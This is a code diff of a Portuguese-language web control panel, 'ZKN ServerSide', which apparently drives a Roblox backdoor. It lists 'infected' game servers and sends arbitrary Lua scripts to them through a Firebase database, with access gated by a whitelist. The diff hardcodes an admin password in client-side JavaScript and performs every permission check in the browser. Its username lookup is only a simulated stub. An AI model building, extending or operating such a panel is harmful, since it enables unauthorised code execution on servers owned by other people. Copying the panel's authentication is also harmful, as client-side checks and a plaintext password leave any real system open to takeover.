@@ -1308,35 +1308,34 @@
                         <i class="fas fa-server"></i>
                     </div>
                     <h1 class="logo-title">ZKN ServerSide</h1>
-                    <p class="logo-subtitle">Sigeon Pex Version</p>
-                    <div class="premium-badge">Premium Edition</div>
+                    <p class="logo-subtitle">by @fr_zkn</p>
+                    <div class="premium-badge">Sigeon Pex EDITION</div>
                 </div>
                 
                 <div class="input-group">
                     <label class="input-label">
-                        <i class="fas fa-key"></i>
-                        Senha de Acesso
+                        <i class="fas fa-user"></i>
+                        UserID da Roblox bro
                     </label>
                     <div class="input-wrapper">
-                        <input type="password" class="input-field" id="password" placeholder="Digite a KEY">
-                        <button class="input-icon" id="passwordToggle">
-                            <i class="fas fa-eye"></i>
-                        </button>
+                        <input type="text" class="input-field" id="userId" placeholder="Digite seu UserID da Roblox">
                     </div>
                 </div>
                 
-                <button class="login-button" onclick="checkPassword()">
-                    <i class="fas fa-sign-in-alt"></i> ACESSAR EXECUTOR
+                <button class="login-button" onclick="checkUserId()">
+                    <i class="fas fa-sign-in-alt"></i> Entrar
                 </button>
                 
                 <div class="discord-section">
-                    <a href="https://discord.gg/B7AJNZM9" target="_blank" class="discord-button">
-                        <i class="fab fa-discord"></i> ENTRAR NO DISCORD :D
+                    <a href="https://discord.gg/cjqncMvte6" target="_blank" class="discord-button">
+                        <i class="fab fa-discord"></i> Obter Whitelist
                     </a>
                 </div>
+
                 
                 <div class="login-footer">
-                    Sistema exclusivo para membros premium<br>
+                    Sistema exclusivo para usuários com whitelist<br>
+                    Sigeon Pex Security<br>
                     Todos os direitos reservados © 2024 ZKN Team
                 </div>
             </div>
@@ -1354,7 +1353,7 @@
                     </div>
                     <div class="dashboard-logo-text">
                         <div class="dashboard-logo-title">ZKN ServerSide</div>
-                        <div class="dashboard-logo-subtitle">Sistema Premium</div>
+                        <div class="dashboard-logo-subtitle">Premium</div>
                     </div>
                 </div>
             </div>
@@ -1393,8 +1392,8 @@
                                 <i class="fas fa-gamepad"></i>
                             </div>
                             <div class="card-title-text">
-                                <h3>Controle de Servidores</h3>
-                                <p>Monitoramento em tempo real</p>
+                                <h3>SERVIDORES</h3>
+                                <p>Clique em "Todos" pra ver os servidores Infectados</p>
                             </div>
                         </div>
                     </div>
@@ -1477,12 +1476,13 @@
                 
                 <!-- System Info -->
                 <div class="system-info">
-                    <h4><i class="fas fa-info-circle"></i> Sistema Premium</h4>
-                    <p>• Execução de scripts via VLuau.loadstring()</p>
-                    <p>• Controle hierárquico de permissões</p>
+                    <h4><i class="fas fa-info-circle"></i> Informações do SS</h4>
+                    <p>• Execução de scripts premium e otimizada</p>
+                    <p>• Sistema de Whitelist</p>
                     <p>• Monitoramento em tempo real</p>
-                    <p>• Interface otimizada para desktop e mobile</p>
+                    <p>• Interface otimizada para PC e mobile</p>
                     <p>• Sistema seguro com criptografia</p>
+                    <p>• Segurança máxima! XD</p>
                 </div>
             </div>
             
@@ -1497,20 +1497,22 @@
                             </div>
                             <div class="card-title-text">
                                 <h3>Executor Premium</h3>
-                                <p>Execute scripts remotamente</p>
+                                <p id="executorPermissionText">Execute scripts remotamente</p>
                             </div>
                         </div>
                     </div>
                     
                     <textarea class="script-editor" id="scriptBox" placeholder="-- Digite seu código Lua aqui
 -- Exemplo: require(119467537742604).ZKN('username')
--- Sistema seguro com bypass VLuau >.<"></textarea>
+-- Sistema seguro com bypass VLuau
+-- Tudo pensado em conforto ^^" 
+                    ${currentUserRole !== 'admin' && !userHasWhitelist ? 'disabled' : ''}></textarea>
                     
                     <div class="script-controls">
                         <select class="server-select" id="serverSelect">
                             <option value="">Selecione um servidor</option>
                         </select>
-                        <button class="execute-button" onclick="sendExecution()">
+                        <button class="execute-button" onclick="sendExecution()" id="executeBtn">
                             <i class="fas fa-play"></i> EXECUTAR
                         </button>
                     </div>
@@ -1566,8 +1568,10 @@
         let servers = {};
         let whitelist = {};
         let currentUserRole = null;
+        let currentUserId = null;
         let currentTab = 'online';
         let selectedServerId = null;
+        let userHasWhitelist = false;
         
         // Create particles background
         function createParticles() {
@@ -1586,34 +1590,71 @@
             }
         }
         
-        // Login Function
-        function checkPassword() {
-            const password = document.getElementById('password').value;
+        // Login Function by UserID
+        function checkUserId() {
+            const userIdInput = document.getElementById('userId').value.trim();
             const loginScreen = document.getElementById('loginScreen');
             const dashboard = document.getElementById('dashboard');
             
-            // Senhas originais
-            if (password === "ZKN9999") {
+            if (!userIdInput) {
+                showToast("Digite um UserID válido", "warning");
+                return;
+            }
+            
+            // Check if it's admin password
+            if (userIdInput === "ZKN9999") { //Eu sei que tá fácil demais, preguiça dagota...
                 // Admin access
                 currentUserRole = 'admin';
+                currentUserId = "ADMIN";
+                userHasWhitelist = true;
                 successfulLogin(loginScreen, dashboard, "Administrador");
-            } else if (password === "40028922ZKN") {
-                // User access
-                currentUserRole = 'user';
-                successfulLogin(loginScreen, dashboard, "VIP");
-            } else {
-                showToast("Senha incorreta. Tente novamente.", "error");
-                document.getElementById('password').style.borderColor = 'var(--danger)';
-                document.getElementById('password').style.boxShadow = '0 0 0 4px rgba(239, 68, 68, 0.2)';
-                
-                setTimeout(() => {
-                    document.getElementById('password').style.borderColor = '';
-                    document.getElementById('password').style.boxShadow = '';
-                }, 1000);
+                return;
             }
+            
+            // Check if user ID is valid number
+            if (isNaN(userIdInput)) {
+                showToast("UserID deve ser um número válido", "error");
+                document.getElementById('userId').style.borderColor = 'var(--danger)';
+                setTimeout(() => {
+                    document.getElementById('userId').style.borderColor = '';
+                }, 1000);
+                return;
+            }
+            
+            // Check whitelist
+            database.ref('whitelist').once('value')
+                .then((snapshot) => {
+                    whitelist = snapshot.val() || {};
+                    
+                    if (whitelist[userIdInput]) {
+                        // User has whitelist
+                        currentUserRole = 'user';
+                        currentUserId = userIdInput;
+                        userHasWhitelist = true;
+                        
+                        // Get username from whitelist data or use ID
+                        const userData = whitelist[userIdInput];
+                        const userName = userData?.username || `User${userIdInput.substring(0, 6)}`;
+                        
+                        successfulLogin(loginScreen, dashboard, userName);
+                    } else {
+                        // User not in whitelist
+                        showToast("UserID não está na whitelist", "error");
+                        document.getElementById('userId').style.borderColor = 'var(--danger)';
+                        document.getElementById('userId').style.boxShadow = '0 0 0 4px rgba(239, 68, 68, 0.2)';
+                        
+                        setTimeout(() => {
+                            document.getElementById('userId').style.borderColor = '';
+                            document.getElementById('userId').style.boxShadow = '';
+                        }, 1000);
+                    }
+                })
+                .catch((error) => {
+                    showToast(`Erro: ${error.message}`, "error");
+                });
         }
         
-        function successfulLogin(loginScreen, dashboard, roleName) {
+        function successfulLogin(loginScreen, dashboard, userName) {
             // Smooth transition
             loginScreen.style.opacity = '0';
             loginScreen.style.transform = 'translateY(-30px) scale(0.9)';
@@ -1624,11 +1665,11 @@
                 
                 setTimeout(() => {
                     dashboard.classList.add('show');
-                    initializeDashboard(roleName);
+                    initializeDashboard(userName);
                 }, 50);
             }, 350);
             
-            showToast(`Bem-vindo, ${roleName}!`, "success");
+            showToast(`Bem-vindo, ${userName}!`, "success");
         }
         
         // Logout Function
@@ -1645,8 +1686,10 @@
                 setTimeout(() => {
                     loginScreen.style.opacity = '1';
                     loginScreen.style.transform = 'translateY(0) scale(1)';
-                    document.getElementById('password').value = '';
+                    document.getElementById('userId').value = '';
                     currentUserRole = null;
+                    currentUserId = null;
+                    userHasWhitelist = false;
                 }, 50);
             }, 350);
             
@@ -1654,12 +1697,9 @@
         }
         
         // Initialize Dashboard
-        function initializeDashboard(roleName) {
+        function initializeDashboard(userName) {
             // Update UI based on role
-            updateRoleUI(roleName);
-            
-            // Setup password toggle
-            setupPasswordToggle();
+            updateRoleUI(userName);
             
             // Load whitelist
             loadWhitelist();
@@ -1674,14 +1714,14 @@
                 document.getElementById('lastUpdate').textContent = timeString;
             }, 1000);
             
-            // Check permission for whitelist
-            setupWhitelistPermissions();
+            // Check permission for whitelist and executor
+            setupPermissions();
         }
         
         // Update UI based on user role
-        function updateRoleUI(roleName) {
+        function updateRoleUI(userName) {
             // Update user info
-            document.getElementById('userName').textContent = roleName;
+            document.getElementById('userName').textContent = userName;
             const userRoleBadge = document.getElementById('userRoleBadge');
             
             if (currentUserRole === 'admin') {
@@ -1693,42 +1733,57 @@
             }
         }
         
-        // Setup password visibility toggle
-        function setupPasswordToggle() {
-            const passwordToggle = document.getElementById('passwordToggle');
-            const passwordInput = document.getElementById('password');
-            
-            if (passwordToggle && passwordInput) {
-                passwordToggle.addEventListener('click', () => {
-                    const type = passwordInput.getAttribute('type') === 'password' ? 'text' : 'password';
-                    passwordInput.setAttribute('type', type);
-                    passwordToggle.innerHTML = type === 'password' ? '<i class="fas fa-eye"></i>' : '<i class="fas fa-eye-slash"></i>';
-                });
-            }
-        }
-        
-        // Setup whitelist permissions based on role
-        function setupWhitelistPermissions() {
+        // Setup permissions based on role
+        function setupPermissions() {
             const addButton = document.getElementById('addWhitelistBtn');
             const whitelistInput = document.getElementById('whitelistInput');
-            const permissionText = document.getElementById('whitelistPermissionText');
+            const whitelistPermissionText = document.getElementById('whitelistPermissionText');
+            const executorPermissionText = document.getElementById('executorPermissionText');
+            const scriptBox = document.getElementById('scriptBox');
+            const executeBtn = document.getElementById('executeBtn');
             
             if (currentUserRole === 'admin') {
-                // Admin can manage whitelist
+                // Admin can manage whitelist and execute scripts
                 if (addButton) addButton.disabled = false;
                 if (whitelistInput) whitelistInput.disabled = false;
-                if (permissionText) {
-                    permissionText.textContent = 'Controle de acesso premium (Admin)';
-                    permissionText.style.color = 'var(--admin)';
+                if (whitelistPermissionText) {
+                    whitelistPermissionText.textContent = 'Controle de acesso premium (Admin)';
+                    whitelistPermissionText.style.color = 'var(--admin)';
                 }
-            } else {
-                // User cannot manage whitelist
+                if (executorPermissionText) {
+                    executorPermissionText.textContent = 'Execute scripts remotamente (Admin)';
+                    executorPermissionText.style.color = 'var(--admin)';
+                }
+                if (scriptBox) scriptBox.disabled = false;
+                if (executeBtn) executeBtn.disabled = false;
+            } else if (userHasWhitelist) {
+                // User with whitelist can only execute scripts
                 if (addButton) addButton.disabled = true;
                 if (whitelistInput) whitelistInput.disabled = true;
-                if (permissionText) {
-                    permissionText.textContent = 'Acesso somente leitura (VIP)';
-                    permissionText.style.color = 'var(--user)';
+                if (whitelistPermissionText) {
+                    whitelistPermissionText.textContent = 'Acesso somente leitura (VIP)';
+                    whitelistPermissionText.style.color = 'var(--user)';
                 }
+                if (executorPermissionText) {
+                    executorPermissionText.textContent = 'Execute scripts remotamente (VIP)';
+                    executorPermissionText.style.color = 'var(--user)';
+                }
+                if (scriptBox) scriptBox.disabled = false;
+                if (executeBtn) executeBtn.disabled = false;
+            } else {
+                // User without whitelist cannot do anything
+                if (addButton) addButton.disabled = true;
+                if (whitelistInput) whitelistInput.disabled = true;
+                if (whitelistPermissionText) {
+                    whitelistPermissionText.textContent = 'Acesso negado - Sem whitelist';
+                    whitelistPermissionText.style.color = 'var(--danger)';
+                }
+                if (executorPermissionText) {
+                    executorPermissionText.textContent = 'Acesso negado - Sem whitelist';
+                    executorPermissionText.style.color = 'var(--danger)';
+                }
+                if (scriptBox) scriptBox.disabled = true;
+                if (executeBtn) executeBtn.disabled = true;
             }
         }
         
@@ -1763,6 +1818,12 @@
                 whitelist = snapshot.val() || {};
                 updateWhitelistDisplay();
                 updateStats();
+                
+                // Check if current user has whitelist (for non-admin users)
+                if (currentUserRole !== 'admin' && currentUserId) {
+                    userHasWhitelist = !!whitelist[currentUserId];
+                    setupPermissions();
+                }
             });
         }
         
@@ -1868,12 +1929,9 @@
             if (whitelistCount) whitelistCount.textContent = Object.keys(whitelist).length;
         }
         
-        // Create server row HTML - COM LINK CORRETO
+        // Create server row HTML
         function createServerRow(id, server, timeDiff, isOnline) {
-            // Usar o placeId do servidor para o link
             const placeId = server.placeId || '0';
-            
-            // LINK CORRETO: Página do jogo no Roblox
             const gamePageUrl = `https://www.roblox.com/games/${placeId}`;
             
             const date = new Date(server.lastActive || Date.now());
@@ -2008,14 +2066,16 @@
                 
                 const dateAdded = data?.addedAt ? new Date(data.addedAt).toLocaleDateString('pt-BR') : 'Data desconhecida';
                 const timeAdded = data?.addedAt ? new Date(data.addedAt).toLocaleTimeString('pt-BR', { hour: '2-digit', minute: '2-digit' }) : '';
+                const username = data?.username || `User${userId.substring(0, 6)}`;
                 
                 item.innerHTML = `
                     <div class="whitelist-info">
                         <div class="whitelist-id">
                             <i class="fas fa-user-check" style="margin-right: 8px;"></i>
-                            ${userId}
+                            ${userId} (${username})
                         </div>
                         <div class="whitelist-date">Adicionado em ${dateAdded} às ${timeAdded}</div>
+                        ${data?.addedBy ? `<div class="whitelist-date" style="font-size: 12px; color: var(--text-lighter);">Por: ${data.addedBy}</div>` : ''}
                     </div>
                     <button class="remove-button" id="removeBtn_${userId}" onclick="removeFromWhitelist('${userId}')" ${currentUserRole !== 'admin' ? 'disabled' : ''}>
                         <i class="fas fa-times"></i> REMOVER
@@ -2067,7 +2127,7 @@
         // Add to Whitelist (Admin only)
         function addToWhitelist() {
             if (currentUserRole !== 'admin') {
-                showToast("Apenas administradores podem adicionar à whitelist", "error");
+                showToast("Apenas @fr_zkn pode adicionar à whitelist", "error");
                 return;
             }
             
@@ -2094,38 +2154,75 @@
                 return;
             }
             
-            const playerData = {
-                addedAt: Date.now(),
-                addedBy: currentUserRole === 'admin' ? "Administrador" : "VIP",
-                role: currentUserRole
-            };
-            
-            database.ref('whitelist/' + userId).set(playerData)
-                .then(() => {
-                    showToast(`Jogador ${userId} adicionado à whitelist`, "success");
-                    input.value = '';
-                    input.focus();
+            // Fetch Roblox username (simulated - in production you'd use Roblox API)
+            fetchRobloxUsername(userId)
+                .then(username => {
+                    const playerData = {
+                        userId: userId,
+                        username: username,
+                        addedAt: Date.now(),
+                        addedBy: currentUserRole === 'admin' ? "Administrador" : "VIP",
+                        role: "vip"
+                    };
                     
-                    // Visual feedback
-                    const addBtn = document.getElementById('addWhitelistBtn');
-                    if (addBtn) {
-                        addBtn.innerHTML = '<i class="fas fa-check"></i> ADICIONADO';
-                        addBtn.style.background = 'var(--user-gradient)';
-                        
-                        setTimeout(() => {
-                            addBtn.innerHTML = '<i class="fas fa-plus"></i> ADICIONAR';
-                        }, 2000);
-                    }
+                    database.ref('whitelist/' + userId).set(playerData)
+                        .then(() => {
+                            showToast(`Jogador ${username} (${userId}) adicionado à whitelist`, "success");
+                            input.value = '';
+                            input.focus();
+                            
+                            // Visual feedback
+                            const addBtn = document.getElementById('addWhitelistBtn');
+                            if (addBtn) {
+                                addBtn.innerHTML = '<i class="fas fa-check"></i> ADICIONADO';
+                                addBtn.style.background = 'var(--user-gradient)';
+                                
+                                setTimeout(() => {
+                                    addBtn.innerHTML = '<i class="fas fa-plus"></i> ADICIONAR';
+                                }, 2000);
+                            }
+                        })
+                        .catch((error) => {
+                            showToast(`Erro: ${error.message}`, "error");
+                        });
                 })
-                .catch((error) => {
-                    showToast(`Erro: ${error.message}`, "error");
+                .catch(error => {
+                    // Fallback if username fetch fails
+                    const playerData = {
+                        userId: userId,
+                        username: `User${userId.substring(0, 6)}`,
+                        addedAt: Date.now(),
+                        addedBy: currentUserRole === 'admin' ? "Administrador" : "VIP",
+                        role: "vip"
+                    };
+                    
+                    database.ref('whitelist/' + userId).set(playerData)
+                        .then(() => {
+                            showToast(`Jogador ${userId} adicionado à whitelist`, "success");
+                            input.value = '';
+                            input.focus();
+                        })
+                        .catch((error) => {
+                            showToast(`Erro: ${error.message}`, "error");
+                        });
                 });
+        }
+        
+        // Simulated Roblox username fetch (replace with real API call)
+        function fetchRobloxUsername(userId) {
+            return new Promise((resolve, reject) => {
+                // In a real implementation, you would call Roblox API here
+                // For now, we'll simulate with a timeout
+                setTimeout(() => {
+                    resolve(`RobloxUser${userId.substring(0, 6)}`);
+                }, 500);
+            });
         }
         
         // Remove from Whitelist (Admin only)
         function removeFromWhitelist(userId) {
             if (currentUserRole !== 'admin') {
-                showToast("Apenas administradores podem remover da whitelist", "error");
+                showToast("Apenas @fr_zkn pode remover da whitelist", "error");
                 return;
             }
             
@@ -2142,8 +2239,14 @@
                 });
         }
         
-        // Send Execution
+        // Send Execution (only for users with whitelist or admin)
         function sendExecution() {
+            // Check permissions
+            if (currentUserRole !== 'admin' && !userHasWhitelist) {
+                showToast("Você precisa estar na whitelist para executar comandos", "error");
+                return;
+            }
+            
             const serverSelect = document.getElementById('serverSelect');
             const scriptBox = document.getElementById('scriptBox');
             
@@ -2165,7 +2268,8 @@
             const commandData = {
                 script: code,
                 timestamp: Date.now(),
-                executor: currentUserRole === 'admin' ? "Administrador" : "VIP",
+                executor: currentUserRole === 'admin' ? "Administrador" : `VIP (${currentUserId})`,
+                executorId: currentUserId,
                 role: currentUserRole
             };
             
@@ -2254,9 +2358,9 @@
         }
         
         // Event Listeners
-        document.getElementById('password').addEventListener('keypress', function(e) {
+        document.getElementById('userId').addEventListener('keypress', function(e) {
             if (e.key === 'Enter') {
-                checkPassword();
+                checkUserId();
             }
         });
         
